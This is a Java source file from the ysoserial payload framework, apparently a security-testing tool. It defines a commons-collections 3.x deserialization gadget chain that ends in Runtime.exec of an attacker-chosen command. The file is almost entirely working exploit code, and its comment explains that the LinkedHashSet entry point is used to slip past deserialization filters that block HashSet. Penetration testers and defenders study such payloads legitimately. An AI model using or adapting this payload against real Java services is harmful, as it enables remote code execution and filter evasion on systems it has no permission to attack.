package ysoserial.payloads;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

import java.io.Serializable;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.LinkedHashSet;
import java.util.Map;

/*
	CC chain via LinkedHashSet entry point.

	Gadget chain:
		ObjectInputStream.readObject()
			LinkedHashSet.readObject()   [inherits HashSet.readObject()]
				HashMap.put()
					HashMap.hash()
						TiedMapEntry.hashCode()
							TiedMapEntry.getValue()
								LazyMap.get()
									ChainedTransformer.transform()
										InvokerTransformer.transform()
											Method.invoke()
												Runtime.exec()

	Why LinkedHashSet?
		- Some filters specifically block HashSet but not LinkedHashSet
		- LinkedHashSet extends HashSet, readObject() is inherited
		- The deserialized type is LinkedHashSet, which passes class-level filters
		  that only check the outermost deserialized class

	Requires:
		commons-collections 3.x
 */

@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"commons-collections:commons-collections:3.1"})
@Authors({ Authors.SU18 })
public class CommonsCollections12 extends PayloadRunner implements ObjectPayload<Serializable> {

	public Serializable getObject(final String command) throws Exception {
		final String[] execArgs = new String[] { command };

		final Transformer[] fakeTransformers = new Transformer[] {
			new ConstantTransformer(1) };
		final ChainedTransformer transformerChain = new ChainedTransformer(fakeTransformers);

		final Transformer[] realTransformers = new Transformer[] {
			new ConstantTransformer(Runtime.class),
			new InvokerTransformer("getMethod", new Class[] {
				String.class, Class[].class }, new Object[] {
				"getRuntime", new Class[0] }),
			new InvokerTransformer("invoke", new Class[] {
				Object.class, Object[].class }, new Object[] {
				null, new Object[0] }),
			new InvokerTransformer("exec",
				new Class[] { String.class }, execArgs),
			new ConstantTransformer(1) };

		final Map innerMap = new HashMap();
		final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
		TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");

		// LinkedHashSet instead of HashSet
		LinkedHashSet<Object> lhs = new LinkedHashSet<Object>(1);
		lhs.add("foo");

		// Get backing HashMap from LinkedHashSet (inherited from HashSet)
		Field f = null;
		try {
			f = java.util.HashSet.class.getDeclaredField("map");
		} catch (NoSuchFieldException e) {
			f = java.util.HashSet.class.getDeclaredField("backingMap");
		}
		Reflections.setAccessible(f);
		HashMap innimpl = (HashMap) f.get(lhs);

		Field f2 = null;
		try {
			f2 = HashMap.class.getDeclaredField("table");
		} catch (NoSuchFieldException e) {
			f2 = HashMap.class.getDeclaredField("elementData");
		}
		Reflections.setAccessible(f2);
		Object[] array = (Object[]) f2.get(innimpl);

		Object node = array[0];
		if (node == null) node = array[1];

		Field keyField = Reflections.getField(node.getClass(), "key");
		keyField.set(node, entry);

		Reflections.setFieldValue(transformerChain, "iTransformers", realTransformers);

		return lhs;
	}

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(CommonsCollections12.class, args);
	}
}
